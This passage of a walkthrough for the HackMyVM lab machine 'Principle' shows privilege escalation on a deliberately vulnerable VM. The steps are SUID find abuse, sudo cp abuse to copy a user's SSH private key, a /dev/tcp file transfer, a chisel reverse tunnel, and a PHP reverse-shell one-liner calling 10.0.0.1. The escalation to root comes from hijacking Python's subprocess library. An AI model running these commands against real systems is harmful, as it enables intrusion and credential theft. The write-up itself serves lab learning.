drwxr-xr-x  4 talos  talos  4096 Jul 14 07:26 talos
</pre></table></code></div></div><p>We look for files with suid:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>$ find / -perm /4000 2&gt;/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/find
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/newgrp
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">find</code> binary seems suspicious:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ ls -la find
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>-rwsr-xr-x  1 talos root     224848 Jan  8  2023 find
</pre></table></code></div></div><p>So when we use <code class="language-plaintext highlighter-rouge">find</code> we are using it as the user <code class="language-plaintext highlighter-rouge">talos</code>. We can take advantage of this abusing the binary.</p><p>If we check <code class="language-plaintext highlighter-rouge">/home/talos</code> we find a note:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ ls -la /home/talos
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>-rw-r----- 1 talos talos  320 Jul 13 15:42 note.txt
</pre></table></code></div></div><p>We abuse <code class="language-plaintext highlighter-rouge">find</code> to read <code class="language-plaintext highlighter-rouge">note.txt</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>$ find . -exec cat /home/talos/note.txt \; -quit
Congratulations! You have made it this far thanks to the manipulated file I left you, I knew you would make it!
Now we are very close to finding this false God Elohim.
I left you a file with the name of one of the 12 Gods of Olympus, out of the eye of Elohim ;)
The tool I left you is still your ally. Good luck to you.
</pre></table></code></div></div><p>A few gods (in a couple of languages) later…</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ find / -iname *afrodita*  2&gt;/dev/null
/etc/selinux/Afrodita.key
</pre></table></code></div></div><p>Let’s see what <code class="language-plaintext highlighter-rouge">Afrodita.key</code> file contais:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>$ cat /etc/selinux/Afrodita.key 
Here is my password:
xxxxxxxxxxx

Now I have done another little trick to help you reach Elohim.
REMEMBER: You need the access key and open the door. Anyway, he has a bad memory and that's why he keeps the lock coded and hidden at home.
</pre></table></code></div></div><h2 id="talos"><span class="mr-2">talos</span><a href="#talos" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Now we can be <code class="language-plaintext highlighter-rouge">talos</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ su - talos
</pre></table></code></div></div><p>Let’s see what we can do:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>talos@Principle:~$ sudo -l
Matching Defaults entries for talos on principle:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User talos may run the following commands on principle:
    (elohim) NOPASSWD: /bin/cp
</pre></table></code></div></div><h3 id="first-flag"><span class="mr-2">First flag</span><a href="#first-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Now, we can use <code class="language-plaintext highlighter-rouge">/bin/cp</code> as <code class="language-plaintext highlighter-rouge">elohim</code>. Let’s see what we can find in <code class="language-plaintext highlighter-rouge">/home/gehenna</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>talos@Principle:~$ ls -la /home/gehenna/
total 40
drwxr-xr-x 4 elohim elohim 4096 Jul 14 11:25 .
drwxr-xr-x 4 root   root   4096 Jul  4 06:11 ..
-rw------- 1 elohim elohim  289 Jul 14 06:38 .bash_history
-rw-r----- 1 elohim elohim  261 Jul  5 08:13 .bash_logout
-rw-r----- 1 elohim elohim 3830 Jul 14 06:37 .bashrc
-rw-r----- 1 elohim elohim  777 Jul 13 17:19 flag.txt
drw-r----- 3 elohim elohim 4096 Jul  2 20:52 .local
-rw-r----- 1 elohim elohim   21 Jul 12 05:35 .lock
-rw-r----- 1 elohim elohim  807 Jul  6 06:28 .profile
drwx------ 2 elohim elohim 4096 Jul  6 11:05 .ssh
</pre></table></code></div></div><p>We can get our first flag:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>talos@principle:/bin$ sudo -u elohim /bin/cp /home/gehenna/flag.txt /dev/stdout
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">lock</code> seems an interesting file, above all after the hint that <code class="language-plaintext highlighter-rouge">talos</code> give us:</p><blockquote><p>he keeps the lock coded and hidden at home</p></blockquote><p>So we print the file content and keep a copy of in our machine:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>talos@principle$ sudo -u elohim /bin/cp /home/gehenna/.lock /dev/stdout
</pre></table></code></div></div><p>Another interesting directory is <code class="language-plaintext highlighter-rouge">.ssh</code>. Seems that elohim could connect via ssh using an rsa private key. But, we didn’t find an ssh service exposed… Anyway, we are going to copy the directory content to our /home. We can’t list the files here, but there always the same, so we try a the usual names:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ sudo -u elohim /bin/cp /home/gehenna/.ssh/authorized_keys /dev/stdout
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ sudo -u elohim /bin/cp /home/gehenna/.ssh/id_rsa /dev/stdout
</pre></table></code></div></div><p>And we save in our machine the content of these files too.</p><p>We also can see some interesting information gossiping the <code class="language-plaintext highlighter-rouge">.bashrc</code> and <code class="language-plaintext highlighter-rouge">.bash_history</code> files. We can see that <code class="language-plaintext highlighter-rouge">elohim</code> edited the python subprocess library:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nano /usr/lib/python3.11/subprocess.py
</pre></table></code></div></div><p>And we can see that <code class="language-plaintext highlighter-rouge">elohim</code> has some aliases defined to restrict a few commands:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre># GOD aliases
alias cat="rbash cat: restricted"
alias vi='rbash: vi: restricted'
alias pico='rbash: pico: restricted'
alias nano='rbash: nano: restricted'
</pre></table></code></div></div><h3 id="ssh"><span class="mr-2">SSH</span><a href="#ssh" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We have to check if there is a SSH service running without being exposed to the outside.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>$ systemctl status sshd
● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/lib/systemd/system/ssh.service; enabled; preset: enabled)
     Active: active (running) since
       Docs: man:sshd(8)
             man:sshd_config(5)
    Process: 441 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
   Main PID: 461 (sshd)
      Tasks: 1 (limit: 202)
     Memory: 4.6M
        CPU: 333ms
     CGroup: /system.slice/ssh.service
             └─461 "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
</pre></table></code></div></div><p>There is a ssh service running. Now we have to find in which port:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>$ ss -tunel
talos@principle:~/.ssh$ ss -tunel
Netid          State           Recv-Q           Send-Q                     Local Address:Port                     Peer Address:Port          Process                                                                
udp            UNCONN          0                0                                0.0.0.0:68                            0.0.0.0:*              ino:14407 sk:1 cgroup:/system.slice/ifup@enp0s3.service &lt;-&gt;           
tcp            LISTEN          0                128                              0.0.0.0:3445                          0.0.0.0:*              ino:14524 sk:2 cgroup:/system.slice/ssh.service &lt;-&gt;
</pre></table></code></div></div><p>Ok. There is a SSH service running on port 3445 and not exposed to the outside.</p><p>As we don’t have permissions to execute ssh, we need to do a reverse proxy tuneling. And, for this, we are going yo use <code class="language-plaintext highlighter-rouge">chisel</code>.</p><p>We need to know the machine architecture to know what <code class="language-plaintext highlighter-rouge">chisel</code> binary upload:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>talos@principle:~/.ssh$ uname -a
Linux principle 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64 GNU/Linux
</pre></table></code></div></div><p>We already knew that it was a linux machine, and now, we also know that it has an amd64 architecture, so we need to upload the linux_amd64 binary. We will send the binary from our host to the server using <code class="language-plaintext highlighter-rouge">netcat</code>. We start the file transfer on our host:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ nc -lvnp 443 &lt; chisel_1.8.1_linux_amd64
</pre></table></code></div></div><p>And we start receiving the file in the <a href="https://hackmyvm.eu/machines/machine.php?vm=Principle">Principle</a> machine:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ cat &gt; chisel &lt; /dev/tcp/10.0.0.1/443
</pre></table></code></div></div><p>We have to give execution permissions to the <code class="language-plaintext highlighter-rouge">chisel</code> binary in the <a href="https://hackmyvm.eu/machines/machine.php?vm=Principle">Principle</a> machine:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ chmod 700 chisel
</pre></table></code></div></div><p>Now we have to setup the reverse proxy. We will establish the <code class="language-plaintext highlighter-rouge">chisel</code> server in our host:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ /chisel_1.8.1_linux_amd64 server --reverse -p 8080
</pre></table></code></div></div><p>And we start the <code class="language-plaintext highlighter-rouge">chisel</code> client in the <a href="https://hackmyvm.eu/machines/machine.php?vm=Principle">Principle</a> machine:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ ./chisel client 10.0.0.1:8080 R:22222:127.0.0.1:3445
</pre></table></code></div></div><p>So we can connect via ssh using a private key, we need to give it the right permissions:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ chmod 600 elohim_id_rsa
</pre></table></code></div></div><p>To connect to <a href="https://hackmyvm.eu/machines/machine.php?vm=Principle">Principle</a> via our reverse proxy we need to connect to the reverse proxy running on our host:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>$ ssh elohim@localhost -p22222 -i elohim_id_rsa

Enter passphrase for key 'id_rsa':
</pre></table></code></div></div><p>We have to enter a passphrase. Don’t worry, rember the words of <code class="language-plaintext highlighter-rouge">talos</code>:</p><blockquote><p>he keeps the lock coded and hidden at home</p></blockquote><p>This is where the <code class="language-plaintext highlighter-rouge">.lock</code> file will be useful.</p><p>The file content is: <code class="language-plaintext highlighter-rouge">7072696e6369706c6573</code>, and we know that is encoded. It’s encoded in hexadecimal, if we decode it we obtain: <code class="language-plaintext highlighter-rouge">principles</code>, and this is this passphrase. Now we can connect via ssh to the <a href="https://hackmyvm.eu/machines/machine.php?vm=Principle">Principle</a> machine.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>$ ssh elohim@localhost -p22222 -i elohim_id_rsa

Enter passphrase for key 'id_rsa':
</pre></table></code></div></div><p>We are already inside and we are <code class="language-plaintext highlighter-rouge">elohim</code></p><h2 id="elohim"><span class="mr-2">elohim</span><a href="#elohim" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>elohim@principle:~$ id
uid=1001(elohim) gid=1001(elohim) groups=1001(elohim),1002(sml)
</pre></table></code></div></div><p>Interesting, we are part from the <code class="language-plaintext highlighter-rouge">sml</code> group. Let’s see what we can do with <code class="language-plaintext highlighter-rouge">sudo</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>Matching Defaults entries for elohim on principle:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User elohim may run the following commands on principle:
    (root) NOPASSWD: /usr/bin/python3 /opt/reviewer.py
</pre></table></code></div></div><p>We can execute the python script <code class="language-plaintext highlighter-rouge">/opt/reviewer.py</code> as <code class="language-plaintext highlighter-rouge">root</code>, but we are trapped in a <code class="language-plaintext highlighter-rouge">rbash</code> shell. So, we need to escape from the <code class="language-plaintext highlighter-rouge">rbash</code>. We can escape from the <code class="language-plaintext highlighter-rouge">rbash</code> and get a <code class="language-plaintext highlighter-rouge">bash</code> shell using php:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>elohim@principle:~$ php -r '$sock=fsockopen("10.0.0.1",4545);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
</pre></table></code></div></div><p>To move confortably we will disable the following restricted aliases:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ unalias cat
$ unalias vi
</pre></table></code></div></div><p>If we check the <code class="language-plaintext highlighter-rouge">reviewer.py</code> script, we can see that we don’t have permissions to write it, but we can read it:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>elohim@principle:~$ ls -la /opt/
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>-rwxr-xr-x  1 root root 1072 Jul  7 15:17 reviewer.py
</pre></table></code></div></div><p>And we can see that the <code class="language-plaintext highlighter-rouge">reviewer.py</code> script file is using the following libraries:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">subprocess</span>
</pre></table></code></div></div><p>If we remember, <code class="language-plaintext highlighter-rouge">elohim</code> was writting in the subproces library:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nano /usr/lib/python3.11/subprocess.py
</pre></table></code></div></div><p>Let’s check the library permissions:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>elohim@principle:~$ ls -la /usr/lib/python3.11/subprocess.py
-rw-rw-r-- 1 root sml 85745 Jul 11 19:04 /usr/lib/python3.11/subprocess.py
</pre></table></code></div></div><p>As the <code class="language-plaintext highlighter-rouge">sml</code> group has write permissions, and we are in the <code class="language-plaintext highlighter-rouge">sml</code> group, we can write this library. We can take advantage of this and perform a python library hijacking.</p><h1 id="privilege-escalation-python-library-hijacking">Privilege escalation (Python library hijacking)</h1><p>As the python subprocess library is writable, we can spawn a bash shell from there. We will append the following line to the library:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">/bin/bash</span><span class="sh">'</span><span class="p">)</span>
</pre></table></code></div></div><p>Now, when we load the library it will open a bash shell. As we can invoke the script that loads the subprocess libary as root, we will get a root shell:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ sudo /usr/bin/python3 /opt/reviewer.py
</pre></table></code></div></div><p>And we can read our last flag!</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>root@principle:/opt# cat /root/flag.txt
</pre></table></code></div></div><p><em>Enjoy! ;)</em></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackmyvm/'>hackmyvm</a>, <a href='/categories/vm/'>vm</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hackmyvm/" class="post-tag no-text-decoration" >hackmyvm</a> <a href="/tags/walkthrough/" class="post-tag no-text-decoration" >walkthrough</a> <a href="/tags/hmv/" class="post-tag no-text-decoration" >hmv</a> <a href="/tags/virtualhost/" class="post-tag no-text-decoration" >virtualhost</a> <a href="/tags/form-abuse/" class="post-tag no-text-decoration" >form abuse</a> <a href="/tags/rbash-escape/" class="post-tag no-text-decoration" >rbash escape</a> <a href="/tags/find-abuse/" class="post-tag no-text-decoration" >find abuse</a> <a href="/tags/cp-abuse/" class="post-tag no-text-decoration" >cp abuse</a> <a href="/tags/sudoers-misconfiguration/" class="post-tag no-text-decoration" >sudoers misconfiguration</a> <a href="/tags/reverse-proxy/" class="post-tag no-text-decoration" >reverse proxy</a> <a href="/tags/chisel/" class="post-tag no-text-decoration" >chisel</a> <a href="/tags/privilege-escalation/" class="post-tag no-text-decoration" >privilege escalation</a> <a href="/tags/python-library-hijacking/" class="post-tag no-text-decoration" >python library hijacking</a> <a href="/tags/principle/" class="post-tag no-text-decoration" >principle</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack%20My%20VM%20-%20Principle%20-%20rubenhortas@blog&url=https%3A%2F%2Frubenhortas.github.io%2Fposts%2Fhmv-principle%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack%20My%20VM%20-%20Principle%20-%20rubenhortas@blog&u=https%3A%2F%2Frubenhortas.github.io%2Fposts%2Fhmv-principle%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Frubenhortas.github.io%2Fposts%2Fhmv-principle%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/python-web-server/">Python web server</a><li><a href="/posts/python-charset-detection/">Python charset detection</a><li><a href="/posts/keep-ssh-session-alive/">Keep alive ssh sessions</a><li><a href="/posts/find-files-containing-specific-text-gnu-linux/">Find files containing specific text on GNU/Linux</a><li><a href="/posts/upload-package-pypi/">Upload a package to PyPI</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/challenge/">challenge</a> <a class="post-tag" href="/tags/gnu-linux/">gnu/linux</a> <a class="post-tag" href="/tags/administration/">administration</a> <a class="post-tag" href="/tags/personal/">personal</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/hardening/">hardening</a> <a 